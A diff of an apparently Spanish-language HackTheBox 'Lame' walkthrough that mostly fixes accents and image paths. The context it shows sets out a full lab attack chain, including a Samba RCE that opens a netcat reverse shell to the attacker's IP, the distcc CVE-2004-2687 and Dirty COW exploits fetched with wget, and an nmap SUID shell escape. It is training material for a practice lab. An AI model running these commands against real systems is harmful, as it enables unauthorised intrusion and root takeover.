@@ -88,7 +88,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento-ftp">RECONOCIMIENTO FTP</h2>
 
-<p>Iniciamos con el reconocimiento del puerto <code class="highlighter-rouge">21</code> donde podemos acceder con el usuario y contraseña “anonymous”, obteniendo disponibilidad de los servicios, sin embargo, no es posible acceder a la información de la maquina.</p>
+<p>Iniciamos con el reconocimiento del puerto <code class="highlighter-rouge">21</code> donde podemos acceder con el usuario y contraseña “anonymous”, obteniendo disponibilidad de los servicios, sin embargo, no es posible acceder a la información de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ ftp 10.10.10.3
   Connected to 10.10.10.3.
@@ -96,7 +96,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   Name <span class="o">(</span>10.10.10.3:bast1ant1c<span class="o">)</span>: anonymous
   331 Please specify the password.
   Password:
-  230 Login successful.
+  230 Login sucessful.
   Remote system <span class="nb">type </span>is UNIX.
   Using binary mode to transfer files.
   ftp&gt; <span class="nb">dir
@@ -105,7 +105,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   226 Directory send OK.
 </code></pre></div></div>
 
-<p>Vamos a verificar si la version de <code class="highlighter-rouge">vsftpd</code> es vulnerable por medio de la utilidad <code class="highlighter-rouge">searchsploit</code>.</p>
+<p>Vamos a verificar si la versión de <code class="highlighter-rouge">vsftpd</code> es vulnerable por medio de la utilidad <code class="highlighter-rouge">searchsploit</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ❯ searchsploit vsftpd 2.3.4
   <span class="nt">---------------------------------------------------------</span> <span class="nt">---------------------------------</span>
@@ -116,7 +116,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   <span class="nt">---------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 </code></pre></div></div>
 
-<p>Luego de revisar el exploit <code class="highlighter-rouge">unix/remote/49757.py</code>, detectamos que agregando <code class="highlighter-rouge">:)</code> en el usuario al momento de acceder, en caso de ser exitoso generamos un acceso a la maquina.</p>
+<p>Luego de revisar el exploit <code class="highlighter-rouge">unix/remote/49757.py</code>, detectamos que agregando <code class="highlighter-rouge">:)</code> en el usuario al momento de acceder, en caso de ser exitoso generamos un acceso a la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ ftp 10.10.10.3
   Connected to 10.10.10.3.
@@ -155,7 +155,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
           WORKGROUP            LAME
 </code></pre></div></div>
 
-<p>Vamos a verificar si la version de <code class="highlighter-rouge">vsftpd</code> es vulnerable por medio de la utilidad <code class="highlighter-rouge">searchsploit</code>.</p>
+<p>Vamos a verificar si la versión de <code class="highlighter-rouge">vsftpd</code> es vulnerable por medio de la utilidad <code class="highlighter-rouge">searchsploit</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ searchsploit samba 3.0.20
   <span class="nt">--------------------------------------------------------------------------------------------------</span>  <span class="nt">-------</span> <span class="nt">---------------------------------</span>
@@ -169,7 +169,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   -------------------------------------------------------------------------------------------------  ------- -----------------------------
 </span></code></pre></div></div>
 
-<p>Luego de revisar el exploit <code class="highlighter-rouge">unix/remote/16320.rb</code>, detectamos una via potencial que permite ejecución remota de comandos <code class="highlighter-rouge">RCE</code> <em>remote command execution</em> al momento de acceder, en caso de ser exitoso generamos un acceso a la maquina.</p>
+<p>Luego de revisar el exploit <code class="highlighter-rouge">unix/remote/16320.rb</code>, detectamos una vía potencial que permite ejecución remota de comandos <code class="highlighter-rouge">RCE</code> <em>remote command execution</em> al momento de acceder, en caso de ser exitoso generamos un acceso a la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ smbclient //10.10.10.3/tmp <span class="nt">-N</span> <span class="nt">--option</span><span class="o">=</span><span class="s1">'client min protocol=NT1'</span> <span class="nt">-c</span> <span class="s1">'logon "/=`nohup nc -e /bin/bash 10.10.14.6 4564`"'</span>
   <span class="nb">nohup</span>: se descarta la entrada y se redirige la salida de error a la salida estándar
@@ -188,12 +188,12 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 </code></pre></div></div>
 
 <p align="center">
-<img src="/assets/images/meta/03-intrusion.png" />
+<img src="/assets/images/lame/03-intrusion.png" />
 </p>
 
 <h2 id="enumeracion-distccd">ENUMERACION DISTCCD</h2>
 
-<p>Vamos a realizar la busqueda de posibles vulnerabilidades en el servicio <code class="highlighter-rouge">distcc</code>, investigando un poco, existe un script <code class="highlighter-rouge">distcc-cve2004-2687</code> de nmap que identifica si la version de distcc es o no vulnerable.</p>
+<p>Vamos a realizar la búsqueda de posibles vulnerabilidades en el servicio <code class="highlighter-rouge">distcc</code>, investigando un poco, existe un script <code class="highlighter-rouge">distcc-cve2004-2687</code> de nmap que identifica si la versión de distcc es o no vulnerable.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ locate .nse | <span class="nb">grep </span>dist
   /usr/share/nmap/scripts/distcc-cve2004-2687.nse
@@ -221,7 +221,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
   |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2004-2687                                            
 </code></pre></div></div>
 
-<p>Detectamos que el servicio es vulnerable al CVE-2004-2687, asi que vamos a hacer uso del exploit <a href="https://github.com/k4miyo/CVE-2004-2687">CVE-2004-2687</a> del repositorio de github de <a href="https://github.com/k4miyo/">k4miyo</a>.</p>
+<p>Detectamos que el servicio es vulnerable al CVE-2004-2687, así que vamos a hacer uso del exploit <a href="https://github.com/k4miyo/CVE-2004-2687">CVE-2004-2687</a> del repositorio de github de <a href="https://github.com/k4miyo/">k4miyo</a>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
 ❯ git clone https://github.com/k4miyo/CVE-2004-2687
@@ -259,14 +259,14 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
 
 <h2 id="escalada-de-privilegios-kernel">ESCALADA DE PRIVILEGIOS KERNEL</h2>
 
-<p>Una vez tenemos acceso a la maquina vamos a realizar el escalamiento de permisos para poder obtener acceso privilegiado y control absoluto, en esta ocasión vamos a verificar la version de kernel de la maquina victima.</p>
+<p>Una vez tenemos acceso a la maquina vamos a realizar el escalamiento de permisos para poder obtener acceso privilegiado y control absoluto, en esta ocasión vamos a verificar la versión de kernel de la maquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  script /dev/null <span class="nt">-c</span> bash
   daemon@lame:/tmp<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
   Linux lame 2.6.24-16-server <span class="c">#1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</span>
 </code></pre></div></div>
 
-<p>Realizamos la busqueda de posibles exploits que logren dar acceso privilegiado a la maquina.</p>
+<p>Realizamos la búsqueda de posibles exploits que logren dar acceso privilegiado a la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ searchsploit linux kernel 2.6.24
   <span class="nt">---------------------------------------------------</span> <span class="nt">---------------------------------</span>
@@ -293,12 +293,12 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
   ❯ <span class="nb">mv </span>40839.c dirty.c
 </code></pre></div></div>
 
-<p>Por medio de un servidor http generado en python desde nuestra maquina, vamos a compartir el exploit descargado.</p>
+<p>Por medio de un servidor http generado en python desde nuestra máquina, vamos a compartir el exploit descargado.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ❯ <span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
-<p>Desde la maquina victima, por medio de la utilidad <code class="highlighter-rouge">wget</code> descargamos el exploit compartido anteriormente.</p>
+<p>Desde la maquina víctima, por medio de la utilidad <code class="highlighter-rouge">wget</code> descargamos el exploit compartido anteriormente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/tmp<span class="nv">$ </span>wget http://10.10.14.6/dirty.c
   <span class="nt">--00</span>:53:49--  http://10.10.14.6/dirty.c
@@ -313,7 +313,7 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
 </code></pre></div></div>
 
 <p align="center">
-<img src="/assets/images/lame/05-expoit.png" />
+<img src="/assets/images/lame/05-exploit.png" />
 </p>
 
 <p>Luego de descargado, se procede a compilar el exploit.</p>
@@ -321,7 +321,7 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  daemon@lame:/tmp<span class="nv">$ </span>gcc <span class="nt">-pthread</span> dirty.c <span class="nt">-o</span> dirty <span class="nt">-lcrypt</span>
 </code></pre></div></div>
 
-<p>Finalmente, ejecutamos el exploit seguido de una contraseña aleatoria, en este caso la mia ha sido <code class="highlighter-rouge">hacked</code>.</p>
+<p>Finalmente, ejecutamos el exploit seguido de una contraseña aleatoria, en este caso la mía ha sido <code class="highlighter-rouge">hacked</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  daemon@lame:/tmp<span class="nv">$ </span>./dirty hacked 
   /etc/passwd successfully backed up to /tmp/passwd.bak
@@ -347,7 +347,7 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
 
 <p><em>NOTA:</em> El script fue modificado para traer como username <code class="highlighter-rouge">bast1ant1c</code>, el usuario por defecto es <code class="highlighter-rouge">firefart</code>.</p>
 
-<p>Ahora que tenemos usuario y contraseña, vamos a conectarnos por <code class="highlighter-rouge">ssh</code> a la maquina victima.</p>
+<p>Ahora que tenemos usuario y contraseña, vamos a conectarnos por <code class="highlighter-rouge">ssh</code> a la maquina víctima.</p>
 
 <p>El exploit ha creado un usuario con permisos de administración, por lo que la conexión realizada nos da acceso a un usuario con todos los privilegios.</p>
 
@@ -369,11 +369,11 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
   bast1ant1c
 </span></code></pre></div></div>
 
-<p><em>NOTA:</em> Sigue la recomendación del exploit “DON’T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd” para restablecer los usuarios de la maquina.</p>
+<p><em>NOTA:</em> Sigue la recomendación del exploit “DON’T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd” para restablecer los usuarios de la máquina.</p>
 
 <h2 id="escalada-de-privilegios-por-permisos">ESCALADA DE PRIVILEGIOS POR PERMISOS</h2>
 
-<p>Ahora vamos a realizar el escalamiento de privilegios revisando los permisos en la maquina.</p>
+<p>Ahora vamos a realizar el escalamiento de privilegios revisando los permisos en la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daemon@lame:/tmp<span class="nv">$ </span>find / <span class="nt">-perm</span> /4000 2&gt;/dev/null                                        
   /bin/umount
@@ -411,7 +411,7 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
   /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
 </code></pre></div></div>
 
-<p>Podemos ver que tenemos permiso de ejecución en <code class="highlighter-rouge">/usr/bin/nmap</code>, asi que buscamos en <a href="https://gtfobins.github.io/gtfobins/nmap/#shell">GTFObins</a> como obtener una shell por este medio.</p>
+<p>Podemos ver que tenemos permiso de ejecución en <code class="highlighter-rouge">/usr/bin/nmap</code>, así que buscamos en <a href="https://gtfobins.github.io/gtfobins/nmap/#shell">GTFObins</a> como obtener una shell por este medio.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  daemon@lame:/tmp<span class="nv">$ </span>nmap <span class="nt">--interactive</span>
   nmap <span class="nt">--interactive</span>
@@ -434,7 +434,7 @@ OSError: <span class="o">[</span>Errno 98] Address already <span class="k">in </
   </span>9179df2fa8
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la maquina <code class="highlighter-rouge">Lame</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">Lame</code> de HackTheBox!</p>
 
 <p align="center">
 <img src="/assets/images/lame/06-finish.png" />
